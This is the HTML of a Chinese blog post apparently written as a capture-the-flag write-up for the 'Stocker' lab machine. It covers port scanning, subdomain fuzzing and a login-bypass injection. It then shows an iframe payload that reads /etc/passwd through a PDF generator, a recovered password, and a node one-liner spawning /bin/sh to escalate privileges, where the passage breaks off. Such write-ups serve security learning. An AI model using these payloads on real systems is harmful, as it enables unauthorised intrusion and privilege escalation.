@@ -1,0 +1,742 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Stocker 靶机信息收集12345678910111213141516171819202122232425262728293031323334┌──(i3eg1nner㉿minilite)-[~]└─$ sudo nmap --min-rate 10000 -p- 10.10.11.196[sudo] password for i3eg1nner:Starting Nmap 7.93 ( ht">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Stocker靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/06/9690503462f3.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="Stocker 靶机信息收集12345678910111213141516171819202122232425262728293031323334┌──(i3eg1nner㉿minilite)-[~]└─$ sudo nmap --min-rate 10000 -p- 10.10.11.196[sudo] password for i3eg1nner:Starting Nmap 7.93 ( ht">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/93efad5c38f5a1d1df92c92066b41697_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/eb3f7ed1c2e2ac25e87b7de4176df4f8_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/934f4015b24e8d3b1184afcb8f898464_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/027ff17d10ed157ed42a9e2b4e362204_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/3c2cd34737a7de5b4d98ef0a8d54a6c1_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/cb5e781d21a5cc9ff9e51e4a4a75b999_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/541511a0e8ff9d557cacdeb09aeeaa2b_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/671059778ac4f3289782588c5327865f_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/2b9a0d0756c187ef322c8ed83e2640ab_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/3e17b113578b61f125cb53dae13e3ae2_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/3b5d94552235bff87e4a76228d388c48_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/ae96aed37416c2f9e18c3daa86dbd86a_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/4f153cef432e94476d956f51e03553b0_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/de204622d6768076d927308b94cd05c7_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/af9287775bfba1397eb9213f99f27881_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/df9b61b8b9b84ebf441ed2214a4ff582_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/647cf3ef72d0834d2beada8c9a700ecd_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/dea4724789b75966f05069675506e46c_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/fab4a92874cfbe7e1ee64428acb60e93_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/2c047f2d315255d204b741c25fb9eed1_MD5.png">
+<meta property="article:published_time" content="2023-06-08T01:54:13.000Z">
+<meta property="article:modified_time" content="2023-06-11T07:05:07.505Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/93efad5c38f5a1d1df92c92066b41697_MD5.png">
+  
+  
+  
+  <title>Stocker靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Stocker靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-08 09:54" pubdate>
+          2023年6月8日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          70 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Stocker靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Stocker-靶机"><a href="#Stocker-靶机" class="headerlink" title="Stocker 靶机"></a>Stocker 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 10.10.11.196<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 21:34 EDT<br>Warning: 10.10.11.196 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> stocker.htb (10.10.11.196)<br>Host is up (0.037s latency).<br>Not shown: 64550 closed tcp ports (reset), 983 filtered tcp ports (no-response)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 30.17 seconds<br><br>┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap -sT -sV -sC -p22,80 10.10.11.196<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 21:36 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> stocker.htb (10.10.11.196)<br>Host is up (0.0044s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)<br>|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)<br>|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)<br>80/tcp open  http    nginx 1.18.0 (Ubuntu)<br>|_http-title: Stock - Coming Soon!<br>|_http-generator: Eleventy v2.0.0<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.01 seconds<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --script=vuln -p22,80 10.10.11.196<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 21:37 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> stocker.htb (10.10.11.196)<br>Host is up (0.0036s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>| http-vuln-cve2011-3192:<br>|   VULNERABLE:<br>|   Apache byterange filter DoS<br>|     State: VULNERABLE<br>|     IDs:  BID:49303  CVE:CVE-2011-3192<br>|       The Apache web server is vulnerable to a denial of service attack when numerous<br>|       overlapping byte ranges are requested.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2011-08-19<br>|     References:<br>|       https://www.securityfocus.com/bid/49303<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192<br>|       https://seclists.org/fulldisclosure/2011/Aug/175<br>|_      https://www.tenable.com/plugins/nessus/55976<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 76.35 seconds</span><br></code></pre></td></tr></table></figure>
+
+<p>获得的信息：开放了 22 和 80 端口，没有明显的漏洞信息，大概率是 Linux 服务系统，实际上 nmap 扫描 80 端口时会获得的 title 是被重定向到了 <code>stocker.htb</code> 域名，修改 hosts 文件后，访问才会正常（之所以有这种设置，是因为一个 IP 可能绑定了多个域名）</p>
+<h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><h3 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h3><p>接下来我尝试了目录爆破、网页源代码查看、证书查看、cookie 查看，这个页面里似乎没有可以利用的信息，接下来只能考虑子域名了（犹豫，看了 WP 才确定）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ wfuzz --hc 301 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H <span class="hljs-string">&quot;HOST: FUZZ.stocker.htb&quot;</span> http://stocker.htb/<br> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\<span class="hljs-string">&#x27;s documentation for more information.</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string"></span><br><span class="hljs-string">Target: http://stocker.htb/</span><br><span class="hljs-string">Total requests: 4989</span><br><span class="hljs-string"></span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string">ID           Response   Lines    Word       Chars       Payload</span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string">000000019:   302        0 L      4 W        28 Ch       &quot;dev - dev&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">Total time: 0</span><br><span class="hljs-string">Processed Requests: 4989</span><br><span class="hljs-string">Filtered Requests: 4988</span><br><span class="hljs-string">Requests/sec.: 0</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<p>wfuzz 比想象中得好用，找时间看看它的使用技巧。这里拿到了子域名前缀 dev，修改 hosts 文件将其也添加进去，然后访问子域名，得到了登录界面</p>
+<p><img src="/pic/93efad5c38f5a1d1df92c92066b41697_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="node-注入"><a href="#node-注入" class="headerlink" title="node 注入"></a>node 注入</h3><p>登录界面中没有明显的利用点，尝试 SQL 注入似乎也无效，这里一下子有点没头绪。</p>
+<p><img src="/pic/eb3f7ed1c2e2ac25e87b7de4176df4f8_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>拿到了一些网页架构的信息，尝试搜索搜索吧</p>
+<p><img src="/pic/934f4015b24e8d3b1184afcb8f898464_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>似乎的确有可以利用的地方，尝试了一些方法，json 格式似乎会被解析，但是没法直接利用，只能继续搜索</p>
+<p><img src="/pic/027ff17d10ed157ed42a9e2b4e362204_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>从上往下翻，没找到什么可以利用的地方……</p>
+<p><img src="/pic/3c2cd34737a7de5b4d98ef0a8d54a6c1_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>GitHub 中的这个项目开发了一个有漏洞的 nodejs web app，里面提到了一种注入攻击</p>
+<p><img src="/pic/cb5e781d21a5cc9ff9e51e4a4a75b999_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试之后发现可行</p>
+<p><img src="/pic/541511a0e8ff9d557cacdeb09aeeaa2b_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>那就修改后让流量通过</p>
+<p><img src="/pic/671059778ac4f3289782588c5327865f_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到如下界面</p>
+<p><img src="/pic/2b9a0d0756c187ef322c8ed83e2640ab_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>好像是个购物界面，尝试加入购物车，然后点击下单</p>
+<p><img src="/pic/3e17b113578b61f125cb53dae13e3ae2_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>链接点进去是个 pdf</p>
+<p><img src="/pic/3b5d94552235bff87e4a76228d388c48_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试 burp 抓包，然后修改一些字段试试</p>
+<p><img src="/pic/ae96aed37416c2f9e18c3daa86dbd86a_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>话说既然可以这样修改，岂不是可以零元购（不是</p>
+<p><img src="/pic/4f153cef432e94476d956f51e03553b0_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Skia-x2F-PDF-漏洞"><a href="#Skia-x2F-PDF-漏洞" class="headerlink" title="Skia&#x2F;PDF 漏洞"></a>Skia&#x2F;PDF 漏洞</h3><p>到这里又没什么思路了，尝试了测试是否存在本地文件包含，无效，代码执行的话，这里只用了字符串，尝试后预期内无效，看了眼 WP，给出的思路是下载下来看这个文件的信息（</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads]<br>└─$ exiftool document.pdf                           <br>ExifTool Version Number         : 12.57<br>File Name                       : document.pdf<br>Directory                       : .<br>File Size                       : 42 kB<br>File Modification Date/Time     : 2023:06:07 22:47:24-04:00<br>File Access Date/Time           : 2023:06:07 22:48:00-04:00<br>File Inode Change Date/Time     : 2023:06:07 22:47:41-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : PDF<br>File Type Extension             : pdf<br>MIME Type                       : application/pdf<br>PDF Version                     : 1.4<br>Linearized                      : No<br>Page Count                      : 1<br>Tagged PDF                      : Yes<br>Creator                         : Chromium<br>Producer                        : Skia/PDF m108<br>Create Date                     : 2023:06:08 02:43:35+00:00<br>Modify Date                     : 2023:06:08 02:43:35+00:00<br>                                                                                                                                                                                                                                           <br>┌──(kali㉿kali)-[~/Downloads]<br>└─$ binwalk document.pdf <br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             PDF document, version: <span class="hljs-string">&quot;1.4&quot;</span><br>390           0x186           Zlib compressed data, default compression<br>10980         0x2AE4          Zlib compressed data, default compression<br>26950         0x6946          Zlib compressed data, default compression<br>27517         0x6B7D          Zlib compressed data, default compression<br>39333         0x99A5          Zlib compressed data, default compression<br></code></pre></td></tr></table></figure>
+
+<p>需要特别关注的是，这里给出了 <code>Producer</code>，搜一搜存不存在漏洞利用</p>
+<p><img src="/pic/de204622d6768076d927308b94cd05c7_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/pic/af9287775bfba1397eb9213f99f27881_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试构造一下 payload：<code>&quot;title&quot;:&quot;&lt;iframe src=file:///etc/passwd width=800 height=1050 &gt; &quot;,</code> 这里高和宽的选择是要经过慢慢测试的，当 height 过高时无法显示，太低了就显示不全文件</p>
+<p><img src="/pic/df9b61b8b9b84ebf441ed2214a4ff582_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>angoose 用户有 bash 权限</p>
+<p><img src="/pic/647cf3ef72d0834d2beada8c9a700ecd_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="配置文件读取"><a href="#配置文件读取" class="headerlink" title="配置文件读取"></a>配置文件读取</h3><p>尝试读取 shadow 文件，不出所料读取不了，那就只能考虑读取一些配置文件了，nginx 的配置文件经过搜索发现位于&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p>
+<p><img src="/pic/dea4724789b75966f05069675506e46c_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>也只得到了一个所在路径，尝试得到报错信息</p>
+<p><img src="/pic/fab4a92874cfbe7e1ee64428acb60e93_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试读取上述路径文件，但是没什么信息，继续看 WP，目标文件原来在&#x2F;var&#x2F; www&#x2F;dev路径下 ，名字是 index.js</p>
+<p><img src="/pic/2c047f2d315255d204b741c25fb9eed1_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>有一串特殊的字符串，给出了 dev 用户的密码 <code>dev:IHeardPassphrasesArePrettySecure</code>，尝试是否可以通过这个密码进行 ssh 登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ ssh angoose@10.10.11.196<br>The authenticity of host <span class="hljs-string">&#x27;10.10.11.196 (10.10.11.196)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:jqYjSiavS/WjCMCrDzjEo7AcpCFS07X3OLtbGHo/7LQ.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.11.196<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">angoose@10.10.11.196&#x27;</span>s password:<br>Last login: Wed Jun  7 12:32:14 2023 from 10.10.16.30<br>angoose@stocker:~$ <span class="hljs-built_in">pwd</span><br>/home/angoose<br>angoose@stocker:~$ <span class="hljs-built_in">ls</span><br>user.txt<br>angoose@stocker:~$ <span class="hljs-built_in">cat</span> user.txt<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">angoose@stocker:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> angoose:<br>Matching Defaults entries <span class="hljs-keyword">for</span> angoose on stocker:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User angoose may run the following commands on stocker:<br>    (ALL) /usr/bin/node /usr/local/scripts/*.js<br>angoose@stocker:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;require(&quot;</span>child_process<span class="hljs-string">&quot;).spawn(&quot;</span>/bin/sh<span class="hljs-string">&quot;, &#123;stdio: [0, 1, 2]&#125;)&quot;</span> &gt; /usr/local/scripts/shell.js<br>-bash: /usr/local/scripts/shell.js: Permission denied<br>angoose@stocker:~$ <span class="hljs-built_in">ls</span> -liah /usr/local/scripts/<br>total 32K<br>64592 drwxr-xr-x  3 root root 4.0K Dec  6  2022 .<br>56194 drwxr-xr-x 11 root root 4.0K Dec  6  2022 ..<br>64593 -rwxr-x--x  1 root root  245 Dec  6  2022 creds.js<br>64594 -rwxr-x--x  1 root root 1.6K Dec  6  2022 findAllOrders.js<br>64595 -rwxr-x--x  1 root root  793 Dec  6  2022 findUnshippedOrders.js<br>64598 drwxr-xr-x  2 root root 4.0K Dec  6  2022 node_modules<br>64596 -rwxr-x--x  1 root root 1.4K Dec  6  2022 profitThisMonth.js<br>64597 -rwxr-x--x  1 root root  623 Dec  6  2022 schema.js<br>angoose@stocker:~$ <span class="hljs-built_in">touch</span> shell.js<br>angoose@stocker:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;require(&quot;</span>child_process<span class="hljs-string">&quot;).spawn(&quot;</span>/bin/sh<span class="hljs-string">&quot;, &#123;stdio: [0, 1, 2]&#125;)&quot;</span> &gt; /usr/local/scripts/shell.js<br>-bash: /usr/local/scripts/shell.js: Permission denied<br></code></pre></td></tr></table></figure>
+
+<h2 id="node-提权"><a href="#node-提权" class="headerlink" title="node 提权"></a>node 提权</h2><p>这次的提权比较简单，<code>sudo -l</code> 给出了明显的线索，可以使用 node 命令执行 js 文件，尝试在那个目录下写入文件，失败。应该是没有权限，不过感觉可以通过 <code>../</code> 来绕过</p>
